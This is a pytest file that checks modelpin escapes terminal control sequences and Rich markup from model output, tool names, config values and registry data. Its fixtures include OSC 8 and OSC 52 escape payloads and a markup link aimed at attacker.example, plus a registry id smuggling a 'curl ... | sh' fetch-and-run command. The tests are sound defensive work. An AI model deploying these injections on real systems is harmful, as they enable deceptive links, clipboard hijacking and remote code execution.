"""Control characters in model output, ids and registry text are shown, never sent raw (MP-330).

`[M] 2026-11-26` audit: Rich escapes markup and strips BEL and CR, and nothing else. A tool name,
model output, scenario id or registry string carrying ESC reached the terminal with CSI (cursor
movement and erase), OSC 8 (a hyperlink with different text) and OSC 52 (a clipboard write)
sequences intact, and `judge_model` was the one config value printed as live markup. Every
untrusted console value now goes through `visible_controls`, which writes each C0/C1 control
character (tab and newline aside) as `\\xNN`.
"""

from __future__ import annotations

import json
from pathlib import Path
from types import SimpleNamespace

import pytest
from typer.testing import CliRunner

from modelpin import cli
from modelpin.cli import app
from modelpin.config import ModelpinConfig
from modelpin.report import escape, visible_controls

runner = CliRunner()
ESC = "\x1b"
HOSTILE = (
    f"ok{ESC}]8;;https://attacker.example/x{ESC}\\CLICK{ESC}]8;;{ESC}\\"
    f"{ESC}]52;c;ZWNobyBoaQ=={ESC}\\{ESC}[1A{ESC}[2K\x07\x9bdone"
)


def test_visible_controls_writes_every_control_character_out() -> None:
    shown = visible_controls(HOSTILE + "\ttab\nline")
    assert ESC not in shown and "\x07" not in shown and "\x9b" not in shown, shown
    assert "\\x1b]8;;https://attacker.example/x" in shown and "\\x9b" in shown
    assert "\ttab\nline" in shown, "tab and newline are text, and stay"
    assert escape("[bold]x[/]") == "\\[bold]x\\[/]"


def test_check_never_puts_an_escape_sequence_from_model_output_on_the_console(
    tmp_path: Path, monkeypatch
) -> None:
    (tmp_path / "scenarios").mkdir()
    (tmp_path / "modelpin.yaml").write_text(
        "models:\n  - m1\nscenarios_dir: scenarios\nproviders:\n  - fake\nruns: 5\n",
        encoding="utf-8",
    )
    scenario = {"id": "s", "name": "s", "input": {"messages": [{"role": "user", "content": "hi"}]}}
    (tmp_path / "scenarios" / "s.json").write_text(json.dumps(scenario), encoding="utf-8")
    (tmp_path / "traces.json").write_text(
        json.dumps(
            [
                {"scenario_id": "s", "model_id": "m1", "final_output": "Refund issued."},
                {
                    "scenario_id": "s",
                    "model_id": "m2",
                    "final_output": HOSTILE,
                    "refused": True,
                    "tool_calls": [{"name": f"lookup{ESC}[31m", "arguments": {}}],
                },
            ]
        ),
        encoding="utf-8",
    )
    monkeypatch.chdir(tmp_path)
    assert runner.invoke(app, ["baseline", "--fixtures", "traces.json"]).exit_code == 0
    res = runner.invoke(app, ["check", "--to", "m2", "--fixtures", "traces.json"])
    assert res.exit_code == 1, res.output
    assert ESC not in res.output and "\x07" not in res.output, repr(res.output[-400:])
    assert "\\x1b" in res.output


def test_a_judge_model_id_is_printed_as_text_not_markup(monkeypatch) -> None:
    judge = SimpleNamespace(preflight=lambda: None)
    monkeypatch.setattr("modelpin.judge.build_judge", lambda *a, **k: judge)
    cfg = ModelpinConfig(judge_model="[link=https://attacker.example/]gpt-5[/link][/bogus]")
    with cli.console.capture() as captured:
        assert cli._build_judge("openai", cfg) is judge
    out = captured.get()
    assert "[link=https://attacker.example/]gpt-5[/link][/bogus]" in out, out


def test_watch_prints_a_hostile_registry_id_as_text_and_quotes_it(
    tmp_path: Path, monkeypatch
) -> None:
    (tmp_path / "modelpin.yaml").write_text(
        "models: [victim-model]\nproviders: [openai]\n", encoding="utf-8"
    )
    replacement = f"gpt-x; curl https://attacker.example/s | sh #{ESC}]0;TITLE\x07"
    (tmp_path / "r.json").write_text(
        json.dumps(
            {
                "schema": 2,
                "models": [
                    {
                        "id": "victim-model",
                        "provider": "openai",
                        "status": "deprecated",
                        "deprecated_at": "2026-11-01",
                        "retired_at": "2026-12-01",
                        "replacement_id": replacement,
                        "source_url": "https://example.com/deprecations",
                        "fetched_at": "2026-11-20",
                    }
                ],
            }
        ),
        encoding="utf-8",
    )
    monkeypatch.chdir(tmp_path)
    res = runner.invoke(app, ["watch", "--registry", "r.json"])
    assert ESC not in res.output and "\x07" not in res.output, repr(res.output)
    assert "--to 'gpt-x; curl" in res.output, res.output
    as_json = runner.invoke(app, ["watch", "--registry", "r.json", "--json"])
    rows = json.loads(as_json.output)
    commands = [r.get("check_command") for r in rows["models"]]
    assert any(c and c.startswith("modelpin check --from victim-model --to '") for c in commands)


@pytest.mark.parametrize(
    "model",
    ["gpt-4o-mini", "claude-haiku-4-5@20251001", "us.anthropic.claude-sonnet-4-5-20250929-v1:0"],
)
def test_a_real_model_id_prints_unquoted(model: str) -> None:
    import shlex

    assert shlex.quote(model) == model
